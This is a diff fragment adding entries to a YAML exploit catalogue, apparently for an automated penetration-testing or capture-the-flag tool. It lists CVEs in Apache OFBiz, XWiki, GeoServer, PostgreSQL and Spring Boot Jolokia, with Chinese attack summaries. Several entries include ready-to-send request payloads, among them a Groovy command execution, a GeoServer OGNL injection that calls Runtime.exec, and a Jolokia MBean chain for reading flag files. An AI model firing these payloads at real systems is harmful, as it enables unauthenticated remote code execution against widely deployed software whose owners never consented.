+          Content-Type: application/x-www-form-urlencoded
+        data: "groovyProgram=throw+new+Exception('id'.execute().text)"
+    confidence: 0.5
+
+  - cve: CVE-2023-49070
+    product: Apache OFBiz
+    severity: critical
+    patterns: ["ofbiz", "xmlrpc"]
+    attack: "Apache OFBiz <18.12.10 XML-RPC 预认证反序列化 RCE：POST /webtools/control/xmlrpc 传恶意 XML-RPC 结构触发 ysoserial 链；与 CVE-2024-38856 同族，按版本选链。"
+    payloads:
+      - method: POST
+        path: /webtools/control/xmlrpc
+    confidence: 0.4
+
+  - cve: CVE-2025-24893
+    product: XWiki
+    severity: high
+    patterns: ["xwiki"]
+    attack: "XWiki SolrSearchMacros RCE（<15.10.11 / 16.5.0）：solr 搜索宏参数注入 → 越权 RCE；有匿名编辑/注册即试宏注入。"
+    payloads: []
+    confidence: 0.3
+
+  - cve: CVE-2024-36401
+    product: GeoServer
+    severity: critical
+    patterns: ["geoserver", "wfs"]
+    attack: "GeoServer <2.23.6 / 2.24.4 / 2.25.2 属性名 OGNL 注入 RCE：WFS GetPropertyValue 请求 propertyName 传 OGNL（eval 链 exec Runtime），无需认证。POST /geoserver/wfs。"
+    payloads:
+      - method: POST
+        path: /geoserver/wfs
+        headers:
+          Content-Type: application/xml
+        data: "<wfs:GetPropertyValue service='WFS' version='2.0.0' xmlns:wfs='http://www.opengis.net/wfs/2.0'><wfs:Query typeNames='sf:archsites'/><wfs:valueReference>exec(java.lang.Runtime.getRuntime(),new java.lang.String[]{'id'})</wfs:valueReference></wfs:GetPropertyValue>"
+    confidence: 0.5
+
+  - cve: CVE-2025-1094
+    product: PostgreSQL
+    severity: high
+    patterns: ["postgresql", "postgres", "pgadmin", "psql"]
+    attack: "PostgreSQL psql 元命令注入（CVE-2025-1094/1097/1098，<17.3/16.7/15.11/14.16/13.19）：SQLi 场景下注入反斜杠元命令（\\!）执行 shell，或 UTF-8 校验差异绕过 COPY FROM PROGRAM 限制；拿到 SQLi 后升级 RCE 用。"
+    payloads: []
+    confidence: 0.3
+
+  - cve: JOLOKIA-MBEAN-RCE
+    product: Spring Boot Jolokia (Tomcat MBeanFactory)
+    severity: critical
+    patterns: ["jolokia", "mbeanfactory", "createStandardContext",
+               "tomcat:type", "actuator"]
+    attack: "/actuator/jolokia 未认证 + Tomcat MBeanRegistry 开启：createStandardContext(Tomcat:type=Host,host=localhost, /flagctx, /challenge) 把 flag 目录挂成 context → DefaultServlet addMapping 后 GET /flagctx/flag.txt 直读；升级链 createValve/createUserDatabaseRealm（JNDI）。完整配方见 skills/actuator-jolokia-exploit.md"
+    payloads:
+      - method: POST
+        path: /actuator/jolokia
+        headers:
+          Content-Type: application/json
+        data: '{"type":"list"}'
+    confidence: 0.6
